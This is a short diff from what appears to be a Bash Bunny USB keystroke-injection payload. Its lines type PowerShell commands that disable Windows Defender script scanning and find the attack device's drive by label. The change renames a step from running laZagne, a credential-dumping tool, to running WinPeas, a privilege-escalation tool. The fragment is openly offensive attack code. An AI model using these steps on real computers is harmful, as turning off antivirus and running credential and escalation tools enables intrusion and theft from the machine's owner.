@@ -46,7 +46,7 @@ QUACK STRING Set-MpPreference -DisableScriptScanning \$true
 QUACK ENTER
 sleep 1
 
-# Run laZagne 
+# Run WinPeas 
 LED STAGE2
 QUACK STRING "\$bashBunnyDrive = (Get-WmiObject -Query \"SELECT * FROM Win32_Volume WHERE Label='$DRIVE_LABEL'\" | Select-Object -ExpandProperty DriveLetter)"
 QUACK ENTER
